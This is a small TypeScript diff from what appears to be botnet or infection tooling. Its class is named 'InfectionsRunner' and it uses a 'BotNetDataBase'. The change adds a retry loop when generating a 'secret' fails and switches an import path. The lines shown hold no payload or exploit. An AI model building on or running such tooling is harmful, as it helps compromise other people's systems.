@@ -1,4 +1,4 @@
-import { createSecret } from "./createSecret/index.ts";
+import { createSecret } from "./createSecret/_index.ts";
 import { CheckConfig } from "./checkConfig/index.ts";
 import { Config } from "../../types/global.d.ts";
 import { BotNetDataBase } from './../../database/index.ts';
@@ -20,6 +20,11 @@ export class InfectionsRunner {
 
         const onThread = async () => {
             const secret = await this.createSecret();
+            if (!secret) {
+                console.log(`\x1b[33m[!]\x1b[0m Rejected generate secret`);
+                onThread();
+                return;
+            }
             console.log(`\x1b[32m[+]\x1b[0m Generated secret: ${secret}`);
             const config = await this.checkConfig(secret);
             if (!config) {
